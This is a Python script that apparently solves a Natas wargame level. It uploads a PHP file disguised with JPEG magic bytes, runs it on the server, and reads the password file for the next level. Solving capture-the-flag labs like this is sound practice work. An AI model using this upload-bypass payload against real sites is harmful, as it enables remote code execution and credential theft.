import config
import os, re, tempfile
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)

file_contents = """\xff\xd8\xff\xe0\x00\x10
<?
	echo readfile("/etc/natas_webpass/natas14")[0];
?>
"""

filepath = tempfile.mktemp()

with open(filepath, "wb") as f:
	f.write(file_contents)

post_data = {
	"MAX_FILE_SIZE" : 1000,
	"filename" : "index.php",
	"submit" : "Upload File"
}

files = {"uploadedfile" : open(filepath, "rb")}

response = post(url, auth=(user, password), data = post_data, files=files)
file_url = url + "/" + re.findall(r"upload/\w{10}\.php", response.content)[0]

password = get(file_url, auth=(user, password)).content.strip().split()[-1]

print(password)